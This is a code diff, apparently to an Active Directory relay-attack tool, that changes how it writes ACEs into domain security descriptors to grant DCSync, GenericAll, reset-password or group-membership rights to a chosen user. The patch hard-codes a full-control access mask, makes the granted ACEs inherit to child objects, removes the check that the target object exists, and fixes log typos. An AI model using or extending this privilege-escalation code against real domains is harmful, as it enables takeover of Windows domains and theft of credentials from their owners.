@@ -374,17 +374,17 @@ class LDAPAttack(ProtocolAttack):
         controls = security_descriptor_control(sdflags=0x04)
         alreadyEscalated = True
 
-        LOG.info('Querying domain security descriptor')
+        #LOG.info('Querying domain security descriptor')
         self.client.search(self.rootDN, f'(distinguishedName={self.targetidentity_dn})', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
 
-        if len(self.client.entries) == 0:
-            LOG.error(f'{self.args.targetidentity} not found in domain. Ensure to use valid object distinguishedName property')
-            return
-
+        #if len(self.client.entries) == 0:
+        #    LOG.error(f'{self.args.targetidentity} not found in domain. Ensure to use valid object distinguishedName property')
+        #    return
+        
         entry = self.client.entries[0]
         secDescData = entry['nTSecurityDescriptor'].raw_values[0]
         secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
-
+        
         if not self.args.delete:
             if self.args.rights.lower() in list(rights.keys()):
                 for guid in rights[self.args.rights]:
@@ -394,7 +394,8 @@ class LDAPAttack(ProtocolAttack):
                 LOG.error(f'{self.args.rights} right is not valid')
                 return
         else:
-            accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
+            #accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
+            accesstype = 983551
             for guid in rights[self.args.rights]:
                 if not self.dacl_remove_ace(secDesc, guid, usersid, accesstype):
                     LOG.error(f'ACE not found in {self.args.targetidentity}')
@@ -408,11 +409,11 @@ class LDAPAttack(ProtocolAttack):
                 if self.args.rights == 'dcsync':
                     LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain', username)
                 elif self.args.rights == 'writemembers':
-                    LOG.info('Success! User %s now has GenericWrite privileges on %s', username, self.args.targetidentity)
+                    LOG.info('Success! User %s now has "Add/Remove Self as Member" privileges on %s', username, self.args.targetidentity)
                 elif self.args.rights == 'resetpassword':
                     LOG.info('Success! User %s now has Reset Password privileges on %s', username, self.args.targetidentity)
                 elif self.args.rights == 'all':
-                    LOG.info('Success! User %s now has GenericAll privileges on $s', username, self.args.targetidentity)
+                    LOG.info('Success! User %s now has GenericAll privileges on %s', username, self.args.targetidentity)
             else:
                 if self.args.rights == 'dcsync':
                     LOG.info('Success! Replication-Get-Changes-All privileges restored for %s', username)
@@ -421,7 +422,7 @@ class LDAPAttack(ProtocolAttack):
                 elif self.args.rights == 'resetpassword':
                     LOG.info('Success! Reset Password privileges restored for %s', username)
                 elif self.args.rights == 'all':
-                    LOG.info('Success! GenericAll privileges restored for %s', usernam)
+                    LOG.info('Success! GenericAll privileges restored for %s', username)
 
 
             # Query the SD again to see what AD made of it
@@ -952,10 +953,11 @@ class LDAPAttack(ProtocolAttack):
 def create_object_ace(privguid, sid):
     nace = ldaptypes.ACE()
     nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
-    nace['AceFlags'] = 0x00
+    nace['AceFlags'] = 0x02 # inherit to child objects
     acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
     acedata['Mask'] = ldaptypes.ACCESS_MASK()
-    acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
+    #acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
+    acedata['Mask']['Mask'] = 983551 # Full control
     acedata['ObjectType'] = string_to_bin(privguid)
     acedata['InheritedObjectType'] = b''
     acedata['Sid'] = ldaptypes.LDAP_SID()
@@ -969,7 +971,7 @@ def create_object_ace(privguid, sid):
 def create_allow_ace(sid):
     nace = ldaptypes.ACE()
     nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
-    nace['AceFlags'] = 0x00
+    nace['AceFlags'] = 0x02
     acedata = ldaptypes.ACCESS_ALLOWED_ACE()
     acedata['Mask'] = ldaptypes.ACCESS_MASK()
     acedata['Mask']['Mask'] = 983551 # Full control
